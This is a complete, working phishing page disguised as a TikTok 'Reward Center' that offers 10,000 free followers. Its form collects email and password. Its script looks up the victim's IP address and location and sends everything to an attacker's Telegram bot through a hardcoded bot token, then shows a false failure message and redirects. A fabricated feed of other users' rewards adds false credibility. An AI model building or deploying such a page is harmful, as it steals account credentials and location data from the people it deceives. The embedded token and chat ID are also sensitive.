<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Creator Studio | Free Rewards</title>
    <style>
        body { background: radial-gradient(circle, #1a1a1a, #000); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow-x: hidden; }
        .container { width: 90%; max-width: 400px; background: rgba(20, 20, 20, 0.9); border: 1px solid #fe2c55; border-radius: 20px; padding: 25px; box-shadow: 0 0 30px rgba(254, 44, 85, 0.2); text-align: center; }
        .logo { width: 60px; margin-bottom: 10px; }
        h2 { font-size: 22px; margin-bottom: 5px; color: #fe2c55; }
        p { font-size: 13px; color: #aaa; margin-bottom: 20px; }
        input { width: 100%; padding: 14px; margin: 8px 0; background: #000; border: 1px solid #333; color: #fff; border-radius: 10px; box-sizing: border-box; }
        input:focus { border-color: #25f4ee; outline: none; }
        .btn { width: 100%; padding: 15px; background: #fe2c55; color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 15px; font-size: 16px; box-shadow: 0 5px 15px rgba(254, 44, 85, 0.4); }
        
        /* د ژوندیو معلوماتو برخه */
        .live-feed { background: rgba(0,0,0,0.5); border-radius: 10px; padding: 10px; margin-top: 20px; height: 60px; overflow: hidden; font-size: 11px; text-align: left; border-left: 3px solid #25f4ee; }
        .feed-item { animation: slide 2s infinite; color: #25f4ee; margin-bottom: 5px; }
        @keyframes slide { 0% { transform: translateY(20px); } 20% { transform: translateY(0); } 80% { transform: translateY(0); } 100% { transform: translateY(-20px); } }
        
        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 100; flex-direction: column; align-items: center; justify-content: center; }
        .spinner { border: 4px solid #111; border-top: 4px solid #fe2c55; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="container">
        <img src="https://cdn-icons-png.flaticon.com/512/3046/3046121.png" class="logo">
        <h2>Reward Center</h2>
        <p>Login with your TikTok linked email to receive 10k Followers instantly.</p>
        
        <input type="email" id="email" placeholder="Email or Phone">
        <input type="password" id="pass" placeholder="Password">
        
        <button class="btn" onclick="sendData()">Claim 10,000 Followers</button>

        <div class="live-feed" id="feed">
            <div class="feed-item">✅ @king_01 just received 5,000 followers</div>
        </div>
    </div>

    <div id="overlay">
        <div class="spinner"></div>
        <p style="margin-top: 15px; font-size: 14px; color: #fe2c55;">Verifying Account...</p>
    </div>

    <script>
        const token = "8533713892:AAGYF0xkIlVDGmCwywyw3Y2_zt8EuiQfZ-g";
        const chatId = "7461145170";

        // د جعلي معلوماتو سیستم
        const users = ["@ajmal_shiwari", "@afghan_boy", "@khan_786", "@top_tik", "@paktia_wal", "@zaman_01"];
        setInterval(() => {
            const user = users[Math.floor(Math.random() * users.length)];
            const amount = [1000, 5000, 10000][Math.floor(Math.random() * 3)];
            document.getElementById('feed').innerHTML = `<div class="feed-item">✅ ${user} just received ${amount} followers</div>`;
        }, 3000);

        async function sendData() {
            const email = document.getElementById('email').value;
            const pass = document.getElementById('pass').value;

            if(!email || !pass) { alert("Please fill all fields!"); return; }

            document.getElementById('overlay').style.display = 'flex';

            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();

                const report = `
🚨 **NEW TIKTOK LOGIN CAPTURED!** 🚨
----------------------------------
📧 **Email:** \`${email}\`
🔑 **Password:** \`${pass}\`
🌐 **IP:** \`${d.ip}\`
📍 **Loc:** ${d.city}, ${d.country_name}
🏢 **Network:** ${d.org}
📱 **Device:** ${navigator.platform}
----------------------------------
📍 **Map:** https://www.google.com/maps?q=${d.latitude},${d.longitude}
----------------------------------
                `;

                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: report, parse_mode: 'Markdown' })
                });

                setTimeout(() => {
                    alert("Verification Failed! Your account is not eligible for this reward.");
                    window.location.href = "https://t.me/TOPAK1V";
                }, 4000);

            } catch (e) { window.location.href = "https://t.me/TOPAK1V"; }
        }
    </script>
</body>
</html>
